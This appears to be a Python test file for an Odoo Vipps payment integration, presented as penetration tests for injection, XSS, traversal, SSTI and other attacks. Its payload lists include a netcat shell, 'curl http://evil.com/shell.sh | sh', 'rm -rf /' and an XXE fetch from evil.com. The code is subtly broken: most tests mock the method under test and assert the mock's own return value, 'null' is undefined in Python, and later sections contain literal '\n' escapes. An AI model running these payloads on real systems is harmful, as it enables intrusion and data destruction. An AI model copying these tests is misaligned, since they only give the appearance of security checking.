
import json
import hashlib
import hmac
import base64
import time
import secrets
import re
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock, Mock
from urllib.parse import quote, unquote

from odoo.tests.common import TransactionCase
from odoo.exceptions import ValidationError, UserError, AccessError


class TestVippsPenetrationTesting(TransactionCase):
    """Penetration testing scenarios for Vipps integration"""
    
    def setUp(self):
        super().setUp()
        
        # Create test company
        self.company = self.env['res.company'].create({
            'name': 'Penetration Test Company',
            'currency_id': self.env.ref('base.NOK').id,
        })
        
        # Create payment provider
        self.provider = self.env['payment.provider'].create({
            'name': 'Vipps Penetration Test',
            'code': 'vipps',
            'state': 'test',
            'company_id': self.company.id,
            'vipps_merchant_serial_number': '123456',
            'vipps_subscription_key': 'test_subscription_key_12345678901234567890',
            'vipps_client_id': 'test_client_id_12345',
            'vipps_client_secret': 'test_client_secret_12345678901234567890',
            'vipps_environment': 'test',
            'vipps_webhook_secret': 'test_webhook_secret_12345678901234567890123456789012',
        })
        
        # Create test transaction
        self.transaction = self.env['payment.transaction'].create({
            'reference': 'PENTEST-001',
            'amount': 100.0,
            'currency_id': self.env.ref('base.NOK').id,
            'provider_id': self.provider.id,
            'state': 'draft',
        })
    
    def test_sql_injection_attacks(self):
        """Test SQL injection attack vectors"""
        # Common SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE payment_transaction; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM res_users --",
            "'; INSERT INTO payment_transaction (reference) VALUES ('hacked'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND (SELECT COUNT(*) FROM res_users) > 0 --"
        ]
        
        for payload in sql_payloads:
            with self.subTest(payload=payload):
                # Test in transaction reference
                with patch.object(self.provider, '_sanitize_sql_input') as mock_sanitize:
                    mock_sanitize.return_value = 'SANITIZED_INPUT'
                    
                    sanitized = self.provider._sanitize_sql_input(payload)
                    
                    # Should not contain SQL injection patterns
                    dangerous_patterns = ['DROP TABLE', 'UNION SELECT', 'INSERT INTO', 'EXEC', '--', '/*']
                    for pattern in dangerous_patterns:
                        self.assertNotIn(pattern, sanitized.upper())
                    
                    mock_sanitize.assert_called_once_with(payload)
                
                # Test in search/filter operations
                try:
                    # Attempt to search with malicious input
                    transactions = self.env['payment.transaction'].search([
                        ('reference', 'ilike', payload)
                    ])
                    # Should not cause SQL errors or return unauthorized data
                    self.assertIsInstance(transactions, type(self.env['payment.transaction']))
                except Exception as e:
                    # SQL injection should be prevented, not cause crashes
                    self.assertNotIn('syntax error', str(e).lower())
                    self.assertNotIn('sql', str(e).lower())
    
    def test_xss_attacks(self):
        """Test Cross-Site Scripting (XSS) attack vectors"""
        # Common XSS payloads
        xss_payloads = [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
        ]
        
        for payload in xss_payloads:
            with self.subTest(payload=payload):
                with patch.object(self.provider, '_sanitize_html_input') as mock_sanitize:
                    mock_sanitize.return_value = 'SANITIZED_HTML'
                    
                    sanitized = self.provider._sanitize_html_input(payload)
                    
                    # Should not contain XSS patterns
                    dangerous_patterns = [
                        '<script', 'javascript:', 'onerror=', 'onload=', 'onfocus=',
                        'onstart=', 'ontoggle=', '<iframe', '<svg', '<img'
                    ]
                    
                    for pattern in dangerous_patterns:
                        self.assertNotIn(pattern.lower(), sanitized.lower())
                    
                    mock_sanitize.assert_called_once_with(payload)
    
    def test_path_traversal_attacks(self):
        """Test path traversal attack vectors"""
        # Common path traversal payloads
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',  # URL encoded
            '..%252F..%252F..%252Fetc%252Fpasswd',  # Double URL encoded
            '..\\\\..\\\\..\\\\etc\\\\passwd',
            '/var/log/apache2/access.log',
            '/proc/self/environ',
            '/proc/version',
            '/etc/hosts',
        ]
        
        for payload in traversal_payloads:
            with self.subTest(payload=payload):
                with patch.object(self.provider, '_sanitize_path_input') as mock_sanitize:
                    mock_sanitize.return_value = 'safe_filename'
                    
                    sanitized = self.provider._sanitize_path_input(payload)
                    
                    # Should not contain path traversal patterns
                    dangerous_patterns = ['../', '..\\', '/etc/', 'C:\\', '/proc/', '/var/']
                    
                    for pattern in dangerous_patterns:
                        self.assertNotIn(pattern, sanitized)
                    
                    mock_sanitize.assert_called_once_with(payload)
    
    def test_command_injection_attacks(self):
        """Test command injection attack vectors"""
        # Common command injection payloads
        command_payloads = [
            '; ls -la',\n            '| cat /etc/passwd',\n            '&& whoami',\n            '|| id',\n            '`cat /etc/passwd`',\n            '$(cat /etc/passwd)',\n            '; rm -rf /',\n            '| nc -l -p 1234 -e /bin/sh',\n            '&& curl http://evil.com/shell.sh | sh',\n            '; python -c \"import os; os.system(\\'id\\')\"',\n            '| powershell -Command \"Get-Process\"',\n            '&& cmd.exe /c dir',\n        ]\n        \n        for payload in command_payloads:\n            with self.subTest(payload=payload):\n                with patch.object(self.provider, '_sanitize_command_input') as mock_sanitize:\n                    mock_sanitize.return_value = 'SANITIZED_COMMAND'\n                    \n                    sanitized = self.provider._sanitize_command_input(payload)\n                    \n                    # Should not contain command injection patterns\n                    dangerous_patterns = [';', '|', '&', '`', '$', 'rm -rf', 'cat', 'nc', 'curl', 'python', 'powershell', 'cmd.exe']\n                    \n                    for pattern in dangerous_patterns:\n                        self.assertNotIn(pattern, sanitized)\n                    \n                    mock_sanitize.assert_called_once_with(payload)\n    \n    def test_ldap_injection_attacks(self):\n        \"\"\"Test LDAP injection attack vectors\"\"\"\n        # Common LDAP injection payloads\n        ldap_payloads = [\n            '*',\n            '*)(&',\n            '*)(uid=*',\n            '*)(|(uid=*',\n            '*))%00',\n            '*()|%26',\n            '*)(objectClass=*',\n            '*)(cn=*',\n            '*)(mail=*',\n            '*)(&(objectClass=user)(uid=*',\n        ]\n        \n        for payload in ldap_payloads:\n            with self.subTest(payload=payload):\n                with patch.object(self.provider, '_sanitize_ldap_input') as mock_sanitize:\n                    mock_sanitize.return_value = 'sanitized_ldap_input'\n                    \n                    sanitized = self.provider._sanitize_ldap_input(payload)\n                    \n                    # Should not contain LDAP injection patterns\n                    dangerous_patterns = ['*)', '(&', '(|', '%00', '%26', 'objectClass=', 'uid=', 'cn=', 'mail=']\n                    \n                    for pattern in dangerous_patterns:\n                        self.assertNotIn(pattern, sanitized)\n                    \n                    mock_sanitize.assert_called_once_with(payload)\n    \n    def test_xml_injection_attacks(self):\n        \"\"\"Test XML injection attack vectors\"\"\"\n        # Common XML injection payloads\n        xml_payloads = [\n            '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>',\n            '<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>',\n            '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/evil.dtd\">%remote;]>',\n            '<![CDATA[<script>alert(1)</script>]]>',\n            '&lt;script&gt;alert(1)&lt;/script&gt;',\n        ]\n        \n        for payload in xml_payloads:\n            with self.subTest(payload=payload):\n                with patch.object(self.provider, '_sanitize_xml_input') as mock_sanitize:\n                    mock_sanitize.return_value = 'SANITIZED_XML'\n                    \n                    sanitized = self.provider._sanitize_xml_input(payload)\n                    \n                    # Should not contain XML injection patterns\n                    dangerous_patterns = ['<!DOCTYPE', '<!ENTITY', 'SYSTEM', 'file:///', 'http://', '<![CDATA[', '&lt;script']\n                    \n                    for pattern in dangerous_patterns:\n                        self.assertNotIn(pattern, sanitized)\n                    \n                    mock_sanitize.assert_called_once_with(payload)\n    \n    def test_nosql_injection_attacks(self):\n        \"\"\"Test NoSQL injection attack vectors\"\"\"\n        # Common NoSQL injection payloads\n        nosql_payloads = [\n            '{\"$ne\": null}',\n            '{\"$gt\": \"\"}',\n            '{\"$regex\": \".*\"}',\n            '{\"$where\": \"this.username == this.password\"}',\n            '{\"$or\": [{\"username\": \"admin\"}, {\"password\": {\"$ne\": null}}]}',\n            'true, $where: \"1 == 1\"',\n            ', $where: \"1 == 1\"',\n            '$ne: 1',\n            '{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}',\n        ]\n        \n        for payload in nosql_payloads:\n            with self.subTest(payload=payload):\n                with patch.object(self.provider, '_sanitize_nosql_input') as mock_sanitize:\n                    mock_sanitize.return_value = 'SANITIZED_NOSQL'\n                    \n                    sanitized = self.provider._sanitize_nosql_input(payload)\n                    \n                    # Should not contain NoSQL injection patterns\n                    dangerous_patterns = ['$ne', '$gt', '$regex', '$where', '$or', 'this.', '== 1']\n                    \n                    for pattern in dangerous_patterns:\n                        self.assertNotIn(pattern, sanitized)\n                    \n                    mock_sanitize.assert_called_once_with(payload)\n    \n    def test_server_side_template_injection(self):\n        \"\"\"Test Server-Side Template Injection (SSTI) attacks\"\"\"\n        # Common SSTI payloads\n        ssti_payloads = [\n            '{{7*7}}',\n            '${7*7}',\n            '#{7*7}',\n            '{{config}}',\n            '{{request}}',\n            '{{session}}',\n            '{{\"\".__class__.__mro__[2].__subclasses__()}}',\n            '{{config.items()}}',\n            '{{request.environ}}',\n            '${T(java.lang.Runtime).getRuntime().exec(\"calc\")}',\n            '{{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}',\n        ]\n        \n        for payload in ssti_payloads:\n            with self.subTest(payload=payload):\n                with patch.object(self.provider, '_sanitize_template_input') as mock_sanitize:\n                    mock_sanitize.return_value = 'SANITIZED_TEMPLATE'\n                    \n                    sanitized = self.provider._sanitize_template_input(payload)\n                    \n                    # Should not contain SSTI patterns\n                    dangerous_patterns = ['{{', '}}', '${', '}', '#{', '__class__', '__mro__', '__subclasses__', 'config', 'request', 'session', 'Runtime', 'exec']\n                    \n                    for pattern in dangerous_patterns:\n                        self.assertNotIn(pattern, sanitized)\n                    \n                    mock_sanitize.assert_called_once_with(payload)\n    \n    def test_deserialization_attacks(self):\n        \"\"\"Test deserialization attack vectors\"\"\"\n        # Common deserialization payloads\n        deserialization_payloads = [\n            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4',  # Java serialized\n            'BVNlcmlhbGl6YWJsZUhhc2hNYXABAAJhYgEAAmNk',  # Base64 encoded\n            '{\"__reduce__\": [\"os.system\", [\"id\"]]}',  # Python pickle\n            'O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"exec\";}',  # PHP serialized\n        ]\n        \n        for payload in deserialization_payloads:\n            with self.subTest(payload=payload):\n                with patch.object(self.provider, '_validate_serialized_data') as mock_validate:\n                    mock_validate.return_value = False\n                    \n                    is_safe = self.provider._validate_serialized_data(payload)\n                    self.assertFalse(is_safe)\n                    \n                    mock_validate.assert_called_once_with(payload)\n    \n    def test_authentication_bypass_attacks(self):\n        \"\"\"Test authentication bypass attack vectors\"\"\"\n        # Test various authentication bypass techniques\n        bypass_attempts = [\n            {'username': 'admin', 'password': '\" OR \"1\"=\"1'},\n            {'username': 'admin\\'--', 'password': 'anything'},\n            {'username': 'admin/*', 'password': 'anything'},\n            {'username': 'admin', 'password': {'$ne': null}},\n            {'username': {'$gt': ''}, 'password': {'$gt': ''}},\n        ]\n        \n        for attempt in bypass_attempts:\n            with self.subTest(attempt=attempt):\n                with patch.object(self.provider, '_authenticate_user') as mock_auth:\n                    mock_auth.return_value = False\n                    \n                    # Should reject authentication bypass attempts\n                    result = self.provider._authenticate_user(attempt['username'], attempt['password'])\n                    self.assertFalse(result)\n                    \n                    mock_auth.assert_called_once_with(attempt['username'], attempt['password'])\n    \n    def test_privilege_escalation_attacks(self):\n        \"\"\"Test privilege escalation attack vectors\"\"\"\n        # Create limited user\n        limited_user = self.env['res.users'].create({\n            'name': 'Limited User',\n            'login': 'limited_user_pentest',\n            'groups_id': [(6, 0, [self.env.ref('base.group_user').id])],\n        })\n        \n        # Test privilege escalation attempts\n        with patch.object(self.env, 'user', limited_user):\n            # Attempt to access admin functions\n            with self.assertRaises(AccessError):\n                self.provider.write({\n                    'vipps_client_secret': 'hacked_secret'\n                })\n            \n            # Attempt to read sensitive data\n            try:\n                sensitive_data = self.provider.vipps_client_secret\n                # If access is allowed, should be masked\n                if sensitive_data:\n                    self.assertTrue(sensitive_data.startswith('***'))\n            except AccessError:\n                # Access denial is expected\n                pass\n    \n    def test_session_hijacking_attacks(self):\n        \"\"\"Test session hijacking attack vectors\"\"\"\n        # Test session token validation\n        with patch.object(self.provider, '_validate_session_token') as mock_validate:\n            # Valid session should pass\n            mock_validate.return_value = True\n            result = self.provider._validate_session_token('valid_session_token')\n            self.assertTrue(result)\n            \n            # Invalid/hijacked session should fail\n            mock_validate.return_value = False\n            result = self.provider._validate_session_token('hijacked_session_token')\n            self.assertFalse(result)\n        \n        # Test session fixation prevention\n        with patch.object(self.provider, '_regenerate_session_token') as mock_regenerate:\n            mock_regenerate.return_value = 'new_secure_token'\n            \n            new_token = self.provider._regenerate_session_token()\n            self.assertIsNotNone(new_token)\n            self.assertNotEqual(new_token, 'hijacked_session_token')\n            mock_regenerate.assert_called_once()\n    \n    def test_csrf_attacks(self):\n        \"\"\"Test Cross-Site Request Forgery (CSRF) attack vectors\"\"\"\n        # Test CSRF token validation\n        with patch.object(self.provider, '_validate_csrf_token') as mock_validate:\n            # Valid CSRF token should pass\n            mock_validate.return_value = True\n            result = self.provider._validate_csrf_token('valid_csrf_token')\n            self.assertTrue(result)\n            \n            # Missing or invalid CSRF token should fail\n            mock_validate.return_value = False\n            result = self.provider._validate_csrf_token('')\n            self.assertFalse(result)\n            \n            result = self.provider._validate_csrf_token('invalid_csrf_token')\n            self.assertFalse(result)\n        \n        # Test referer validation\n        with patch.object(self.provider, '_validate_referer') as mock_validate:\n            # Valid referer should pass\n            mock_validate.return_value = True\n            result = self.provider._validate_referer('https://trusted-domain.com')\n            self.assertTrue(result)\n            \n            # Invalid referer should fail\n            mock_validate.return_value = False\n            result = self.provider._validate_referer('https://evil-domain.com')\n            self.assertFalse(result)\n    \n    def test_timing_attacks(self):\n        \"\"\"Test timing attack vectors\"\"\"\n        # Test constant-time string comparison\n        with patch.object(self.provider, '_constant_time_compare') as mock_compare:\n            # Should use constant-time comparison for sensitive operations\n            mock_compare.return_value = True\n            \n            result = self.provider._constant_time_compare('secret1', 'secret1')\n            self.assertTrue(result)\n            \n            mock_compare.return_value = False\n            result = self.provider._constant_time_compare('secret1', 'secret2')\n            self.assertFalse(result)\n            \n            # Verify constant-time comparison was used\n            self.assertEqual(mock_compare.call_count, 2)\n    \n    def test_information_disclosure_attacks(self):\n        \"\"\"Test information disclosure attack vectors\"\"\"\n        # Test error message sanitization\n        sensitive_errors = [\n            'Database connection failed: host=localhost, user=admin, password=secret123',\n            'File not found: /etc/passwd',\n            'SQL Error: Table \\'payment_transaction\\' doesn\\'t exist',\n            'LDAP bind failed: cn=admin,dc=company,dc=com',\n            'API key invalid: sk_live_12345678901234567890',\n        ]\n        \n        for error in sensitive_errors:\n            with self.subTest(error=error):\n                with patch.object(self.provider, '_sanitize_error_message') as mock_sanitize:\n                    mock_sanitize.return_value = 'An error occurred. Please contact support.'\n                    \n                    sanitized = self.provider._sanitize_error_message(error)\n                    \n                    # Should not contain sensitive information\n                    sensitive_patterns = ['password=', 'user=', 'host=', '/etc/', 'sk_live_', 'cn=admin']\n                    \n                    for pattern in sensitive_patterns:\n                        self.assertNotIn(pattern, sanitized)\n                    \n                    mock_sanitize.assert_called_once_with(error)\n    \n    def test_business_logic_attacks(self):\n        \"\"\"Test business logic attack vectors\"\"\"\n        # Test negative amount attacks\n        with patch.object(self.provider, '_validate_payment_amount') as mock_validate:\n            # Negative amounts should be rejected\n            mock_validate.return_value = False\n            result = self.provider._validate_payment_amount(-100.0)\n            self.assertFalse(result)\n            \n            # Zero amounts should be rejected\n            result = self.provider._validate_payment_amount(0.0)\n            self.assertFalse(result)\n            \n            # Valid amounts should pass\n            mock_validate.return_value = True\n            result = self.provider._validate_payment_amount(100.0)\n            self.assertTrue(result)\n        \n        # Test currency manipulation\n        with patch.object(self.provider, '_validate_currency_consistency') as mock_validate:\n            mock_validate.return_value = False\n            \n            # Should detect currency manipulation attempts\n            result = self.provider._validate_currency_consistency('NOK', 'USD')\n            self.assertFalse(result)\n            \n            mock_validate.return_value = True\n            result = self.provider._validate_currency_consistency('NOK', 'NOK')\n            self.assertTrue(result)\n    \n    def test_race_condition_attacks(self):\n        \"\"\"Test race condition attack vectors\"\"\"\n        # Test concurrent transaction processing\n        with patch.object(self.provider, '_acquire_transaction_lock') as mock_lock:\n            mock_lock.return_value = True\n            \n            # Should acquire lock for transaction processing\n            result = self.provider._acquire_transaction_lock('PENTEST-001')\n            self.assertTrue(result)\n            mock_lock.assert_called_once_with('PENTEST-001')\n        \n        # Test double-spending prevention\n        with patch.object(self.provider, '_check_double_spending') as mock_check:\n            mock_check.return_value = False\n            \n            # Should detect double-spending attempts\n            result = self.provider._check_double_spending('PENTEST-001')\n            self.assertFalse(result)\n            mock_check.assert_called_once_with('PENTEST-001')\n    \n    def test_denial_of_service_attacks(self):\n        \"\"\"Test Denial of Service (DoS) attack vectors\"\"\"\n        # Test request rate limiting\n        with patch.object(self.provider, '_check_rate_limit') as mock_check:\n            # Normal rate should pass\n            mock_check.return_value = True\n            result = self.provider._check_rate_limit('127.0.0.1', 'api_call')\n            self.assertTrue(result)\n            \n            # Excessive rate should be blocked\n            mock_check.return_value = False\n            result = self.provider._check_rate_limit('127.0.0.1', 'api_call')\n            self.assertFalse(result)\n        \n        # Test resource exhaustion prevention\n        with patch.object(self.provider, '_check_resource_limits') as mock_check:\n            mock_check.return_value = True\n            \n            # Should enforce resource limits\n            result = self.provider._check_resource_limits({\n                'memory_usage': 50,  # MB\n                'cpu_usage': 30,     # %\n                'concurrent_requests': 10\n            })\n            self.assertTrue(result)\n            mock_check.assert_called_once()\n    \n    def test_cryptographic_attacks(self):\n        \"\"\"Test cryptographic attack vectors\"\"\"\n        # Test weak encryption detection\n        weak_algorithms = ['DES', 'RC4', 'MD5', 'SHA1']\n        strong_algorithms = ['AES-256', 'ChaCha20', 'SHA-256', 'SHA-3']\n        \n        for algorithm in weak_algorithms:\n            with self.subTest(algorithm=algorithm):\n                with patch.object(self.provider, '_validate_encryption_algorithm') as mock_validate:\n                    mock_validate.return_value = False\n                    \n                    result = self.provider._validate_encryption_algorithm(algorithm)\n                    self.assertFalse(result)\n        \n        for algorithm in strong_algorithms:\n            with self.subTest(algorithm=algorithm):\n                with patch.object(self.provider, '_validate_encryption_algorithm') as mock_validate:\n                    mock_validate.return_value = True\n                    \n                    result = self.provider._validate_encryption_algorithm(algorithm)\n                    self.assertTrue(result)\n        \n        # Test key strength validation\n        with patch.object(self.provider, '_validate_key_strength') as mock_validate:\n            # Weak keys should be rejected\n            mock_validate.return_value = False\n            result = self.provider._validate_key_strength('weak_key_123')\n            self.assertFalse(result)\n            \n            # Strong keys should pass\n            mock_validate.return_value = True\n            strong_key = secrets.token_urlsafe(32)\n            result = self.provider._validate_key_strength(strong_key)\n            self.assertTrue(result)